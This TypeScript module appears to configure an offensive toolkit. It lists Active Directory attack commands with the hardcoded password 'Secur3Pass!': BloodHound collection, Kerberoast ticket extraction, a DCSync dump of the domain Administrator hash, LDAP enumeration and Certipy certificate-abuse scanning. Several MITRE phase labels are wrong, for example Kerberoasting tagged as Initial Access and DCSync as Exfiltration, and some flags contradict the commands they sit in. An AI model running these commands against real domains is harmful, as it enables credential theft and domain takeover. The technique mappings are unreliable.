import { ToolModule } from './offensiveTools'

export const AD_TOOLS: ToolModule[] = [
  {
    id: 'bloodhound_ce',
    name: 'BloodHound AD Grapher (Stealth Collector)',
    category: 'Active Directory',
    riskLevel: 'HIGH',
    mitreTechnique: 'T1087.002 (Account Discovery: Domain Account)',
    mitrePhase: 'Discovery',
    description: 'Cartographie globale des relations de privilèges, des ACLs et des chemins d’escalade Active Directory.',
    commandTemplate: 'bloodhound-python -u operator -p "Secur3Pass!" -d {target} -c All --json --nesting',
    defaultArgs: { threads: '20', timeout: '10s', extraFlags: '--secure --dns-tcp' }
  },
  {
    id: 'kerberoast',
    name: 'Impacket Kerberoast Suite (Rapid Extraction)',
    category: 'Active Directory',
    riskLevel: 'CRITICAL',
    mitreTechnique: 'T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)',
    mitrePhase: 'Initial Access',
    description: 'Extraction haut débit des tickets de service Kerberos associés aux comptes de domaine pour cassage de clés hors-ligne.',
    commandTemplate: 'GetUserSPNs.py corp.local/operator:Secur3Pass! -dc-ip {target} -request -outputfile tickets.hash',
    defaultArgs: { threads: '1', timeout: '8s', extraFlags: '-no-pass -dc-host' }
  },
  {
    id: 'secretsdump_dcsync',
    name: 'Impacket Secretsdump (DCSync Attack)',
    category: 'Active Directory',
    riskLevel: 'CRITICAL',
    mitreTechnique: 'T1003.006 (OS Credential Dumping: DCSync)',
    mitrePhase: 'Exfiltration',
    description: 'Récupération de l’intégralité des hashs NTLM du domaine via réplication simulée du Domain Controller.',
    commandTemplate: 'secretsdump.py corp.local/operator:Secur3Pass!@{target} -just-dc-user Administrator',
    defaultArgs: { threads: '5', timeout: '10s', extraFlags: '-target-ip' }
  },
  {
    id: 'ldap_enum_audit',
    name: 'Windapsearch AD LDAP Enumerator',
    category: 'Active Directory',
    riskLevel: 'MEDIUM',
    mitreTechnique: 'T1087.002 (Account Discovery)',
    mitrePhase: 'Discovery',
    description: 'Énumération approfondie des objets Active Directory (utilisateurs, ordinateurs, groupes privilégiés) via requêtes LDAP.',
    commandTemplate: 'windapsearch.py -d corp.local -u operator -p "Secur3Pass!" --dc-ip {target} -m users',
    defaultArgs: { threads: '15', timeout: '12s', extraFlags: '--full-results' }
  },
  {
    id: 'certipy_esc_audit',
    name: 'Certipy AD CS Certificate Abuse Engine',
    category: 'Active Directory',
    riskLevel: 'CRITICAL',
    mitreTechnique: 'T1649 (Steal or Forge Authentication Certificates)',
    mitrePhase: 'Execution',
    description: 'Recherche et exploitation des vulnérabilités des services de certificats Active Directory (AD CS ESC1 à ESC8).',
    commandTemplate: 'certipy find -u operator@corp.local -p "Secur3Pass!" -dc-ip {target} -vulnerable -json',
    defaultArgs: { threads: '10', timeout: '15s', extraFlags: '-stdout' }
  }
]